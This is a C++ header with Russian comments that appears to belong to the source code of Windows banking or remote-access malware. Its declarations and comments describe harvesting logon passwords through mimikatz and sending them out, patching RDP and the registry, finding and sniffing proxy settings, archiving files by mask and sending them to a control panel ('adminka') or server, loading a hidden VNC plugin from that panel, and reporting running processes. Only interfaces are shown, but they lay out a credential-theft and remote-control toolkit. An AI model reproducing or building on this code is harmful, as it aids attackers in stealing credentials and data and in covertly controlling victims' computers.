#pragma once

#include "core\core.h"
#include "core\proxy.h"
#include "config.h"

namespace mimikatz
{

//собирает об логинах машины и отсылает их
bool SendAllLogonsThread(); //в отдельном потоке
bool SendAllLogons();
//патчит сервис рдп
bool PatchRDP();
//обновляет реестр для рдп
bool UpdateReestr();
bool GetLogonPasswords( StringBuilder& s );

}

//патчит (изменяет некоторые файлы) файлы, чтобы было нормальное рдп
bool PatchRDPFiles();

namespace Secure
{

typedef bool (*typeSecureFunc)( const Mem::Data&, const StringBuilder& folder );

bool Lsa( const Mem::Data& data, const StringBuilder& folder );

}

//находит все настройки прокси, с разных браузеров
int FindProxyAddr( Proxy::Info* addr, int size );
//находит строки аутентификации для найденных прокси (поиск в отдельном потоке)
//void FindAuthenticationProxy( Proxy::Info* addr, int c_addr );
//поиск прокси через сниффер
DWORD WINAPI FindProxyAddrCrossSniffer( void* );
//формирует и запускает команду adminka с целью сохранения в конфиг файле настроек прокси
void SendCmdAdminka( Proxy::Info* addr, int c_addr );
//поиск файлов по маске в папке path, результат сжимается кабом под именем name и отправляется в админку (dst = 1) или на сервер (dst=2),
//или в админку и сервер (dst = 3)
//Воозвращает количеств отправленных файлов
//маска должна содержать только возможные символы для файла, не должно быть знака *, маска это подстрока 
int FindFiles( const StringBuilder& path, const StringBuilder& mask, int dst, const StringBuilder& name );

namespace VNC
{

//функция сообщающая о рзультате запуска длл vnc,
//если res =
// 0 - запуск успешный
// 1 - не удалось загрузить плагин
// 2 - нехватка памяти	
// 3 - не удалось запустить плагин в памяти
// 4 - ненайдены функции экспорта VncStartServer и VncStopServer
// 5 - Функция VncStartServer вернула ошибку
typedef void (*typeFuncRes)( int res );

//загружает с админки длл vnc, запускает и результат сообщает callback функции func,
//функция работает асинхронно, в tag указываем какие данные должна отослать длл при коннекте на указанный ip 
bool Start( const char* namePlugin, const char* namePlugin_x64, AddressIpPort& ipp, typeFuncRes func, void* tag = 0, int c_tag = 0 );
//запускает внц с параметрами по умолчанию
bool StartDefault( AddressIpPort& ipp, bool hvnc, void* tag = 0, int c_tag = 0 );
//возвращает имя pipe внц сервера
StringBuilder& GetNameVNCServer( StringBuilder& s );

};

//в строку s записывает по строкам список запущенных процессов (текстовый файл с именами процессов)
//возвращает количество запущенных процессов
int ListProcess( StringBuilder& s );
//отсылает список процессов в dst: 1 - админку, 2 - сервер
bool SendListProcess( int dst );

namespace WinCmd
{

void Start( const char* naneUser );

}
